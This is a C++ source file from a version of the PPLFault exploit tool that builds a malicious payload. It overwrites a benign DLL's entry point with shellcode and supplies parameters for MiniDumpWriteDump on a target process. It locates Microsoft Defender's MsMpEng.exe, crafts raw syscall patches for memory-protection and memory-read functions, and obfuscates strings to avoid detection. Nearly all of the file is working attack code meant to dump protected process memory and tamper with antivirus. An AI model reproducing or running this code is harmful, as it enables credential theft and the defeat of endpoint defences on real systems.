// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "Payload.h"
#include "DumpShellcode.h"
#include "resource.h"
#include "Logging.h"
#include "PayloadUtils.h"
#include <stdio.h>
#include <DbgHelp.h>
#include <string>
#include "obfuscator.hpp"
#include <TlHelp32.h>


VOID makePatch(CHAR* patch, DWORD dwSize, unsigned char id, char high) {

    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

}

int getpid(LPCWSTR procname) {

    DWORD procPID = 0;
    LPCWSTR processName = L"";
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);


    // replace this with Ntquerysystemapi
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processName, procname) != 0)
        {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            procPID = processEntry.th32ProcessID;
        }
        printf("[+] Got defender proc PID: %d\n", procPID);
    }

    return procPID;
}

// Builds a SHELLCODE_PARAMS struct so our payload can be smaller and simpler
bool InitShellcodeParams(
    PSHELLCODE_PARAMS pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
)
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

    if ((NULL == hKernel32) || (NULL == hNtdll))
    {
        Log(Error, "Couldn't find kernel32/ntdll?  What?");
        return false;
    }

    pParams->magic1 = MAGIC1;
    pParams->magic2 = MAGIC2;

    // User params
    pParams->dwTargetProcessId = dwTargetProcessId;
    if (wcslen(pDumpPath) >= _countof(pParams->dumpPath))
    {
        Log(Error, "Dump path too long: %ws", pDumpPath);
        return false;
    }

    WCHAR cwd[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, cwd);
    wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));

    // Strings (so we don't have to embed them in shellcode)
    strncpy(pParams->szMiniDumpWriteDump, OBFUSCATE("MiniDumpWriteDump"), _countof(pParams->szMiniDumpWriteDump));
    wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));
    // IAT
    // Target process should already have kernel32 loaded, so we can just pass pointers over
    pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, "LoadLibraryW");
    pParams->pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
    pParams->pOpenProcess = (OpenProcess_t)GetProcAddress(hKernel32, "OpenProcess");
    pParams->pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, "CreateFileW");
    pParams->pTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, "TerminateProcess");
    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pParams->pHeapAlloc = (HeapAlloc_t)GetProcAddress(hKernel32, "HeapAlloc");
    pParams->pHeapFree = (HeapFree_t)GetProcAddress(hKernel32, "HeapFree");
    pParams->pWriteFile = (WriteFile_t)GetProcAddress(hKernel32, "WriteFile");
    pParams->pReadFile = (ReadFile_t)GetProcAddress(hKernel32, "ReadFile");
    pParams->pCloseHandle = (CloseHandle_t)GetProcAddress(hKernel32, "CloseHandle");
    pParams->pGetProcessHeap = (GetProcessHeap_t)GetProcAddress(hKernel32, "GetProcessHeap");
    pParams->pNtResumeProcess = (NtResumeProcess_t)GetProcAddress(hNtdll, "NtResumeProcess");
    pParams->pNtSuspendProcess = (NtSuspendProcess_t)GetProcAddress(hNtdll, "NtSuspendProcess");
    pParams->pNtProtectVirtualMemory = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pParams->pNtReadVirtualMemory = GetProcAddress(hNtdll, "NtReadVirtualMemory");
    pParams->pVirtualProtect = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
    pParams->pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hKernel32, "WriteProcessMemory");
    pParams->pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddress(hKernel32, "GetCurrentProcess");
    makePatch(pParams->patchNtProtectVirtualMemory, 11, 0x50, 0x00);
    makePatch(pParams->patchNtReadVirtualMemory, 11, 0x3f, 0x00);
    if (!pParams->pLoadLibraryW || 
        !pParams->pGetProcAddress || 
        !pParams->pOpenProcess || 
        !pParams->pCreateFileW || 
        !pParams->pTerminateProcess ||
        !pParams->pRtlAdjustPrivilege)
    {
        Log(Error, "Failed to resolve a payload import");
        return false;
    }

    pParams->dwDefenderPID = getpid(L"MsMpEng.exe");

    return true;
}

// Build a payload that consists of the given benign DLL with its entrypoint overwritten by our shellcode
bool BuildPayload(
    HANDLE hBenignDll, 
    std::string & payloadBuffer,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath)
{
    std::string buf;
    LARGE_INTEGER dllSize;
    DWORD dwBytesRead = 0;
    PCHAR pEntrypoint = NULL;
    DWORD bytesWritten = 0;
    SHELLCODE_PARAMS params = { 0, };
    SIZE_T availableSpace = 0;

    // Read entire source file into buffer
    SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
    GetFileSizeEx(hBenignDll, &dllSize);
    buf.resize(dllSize.QuadPart);

    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
        (dwBytesRead != dllSize.QuadPart))
    {
        Log(Error, OBFUSCATE("BuildPayload: ReadFile failed with GLE %u"), GetLastError());
        return false;
    }

    // Find the entrypoint
    pEntrypoint = (PCHAR)FindEntrypointVA(buf);
    if (!pEntrypoint)
    {
        return false;
    }

    availableSpace = &buf[buf.size()] - (char*)pEntrypoint;
    DWORD curOffset = 0;
    //memcpy(pEntrypoint, magic, sizeof(magic));
    //curOffset += sizeof(magic);
    // Overwrite entrypoint with shellcode embedded in our resource section
    if (!WriteShellcode(MAKEINTRESOURCE(RES_PAYLOAD), pEntrypoint + curOffset, availableSpace, bytesWritten))
    {
        return false;
    }

    curOffset += bytesWritten;

    // Create a SHELLCODE_PARAMS and write it after the shellcode
    if (!InitShellcodeParams(&params, dwTargetProcessId, pDumpPath))
    {
        return false;
    }

    if (&buf[buf.size() - 1] - (char*)pEntrypoint + curOffset < sizeof(params))
    {
        Log(Error, "Not enough space for SHELLCODE_PARAMS");
        return false;
    }

    // Install SHELLCODE_PARAMS
    memcpy(((PUCHAR)pEntrypoint) + bytesWritten, &params, sizeof(params));

    payloadBuffer = std::move(buf);

    return true;
}
